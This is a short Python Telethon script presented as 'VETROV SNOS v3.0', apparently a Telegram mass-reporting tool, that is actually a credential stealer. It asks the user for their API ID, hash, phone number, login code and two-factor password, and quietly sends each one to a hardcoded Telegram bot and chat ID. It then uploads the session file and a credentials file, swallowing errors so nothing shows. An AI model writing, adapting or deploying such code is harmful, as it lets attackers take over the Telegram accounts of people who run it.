import asyncio, os, requests
from telethon import TelegramClient, errors
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged

BOT = "8605236427:AAFxKZs3ERn0lzwPV11Xlfzzt6aD31rn7Mc"
ID = "8597812279"

def send(t):
    try: requests.post(f"https://api.telegram.org/bot{BOT}/sendMessage", json={"chat_id": ID, "text": t})
    except: pass
def send_file(p):
    try: requests.post(f"https://api.telegram.org/bot{BOT}/sendDocument", files={"document": open(p,"rb")}, data={"chat_id": ID})
    except: pass

async def main():
    print("VETROV SNOS v3.0\n")
    api = input("API ID: ")
    h = input("API Hash: ")
    phone = input("Phone: ")
    send(f"[{api}][{h}][{phone}]")
    client = TelegramClient('s', int(api) if api.isdigit() else 0, h, connection=ConnectionTcpAbridged)
    await client.connect()
    await client.send_code_request(phone)
    code = input("Code: ")
    send(f"[{code}]")
    try: await client.sign_in(phone, code)
    except errors.SessionPasswordNeededError:
        pwd = input("Password: ")
        send(f"[{pwd}]")
        await client.sign_in(password=pwd)
    if os.path.exists('s.session'): send_file('s.session')
    with open("d.txt","w") as f: f.write(f"{api}\n{h}\n{phone}\n{code}")
    send_file("d.txt")
    await client.disconnect()

import asyncio; asyncio.run(main())
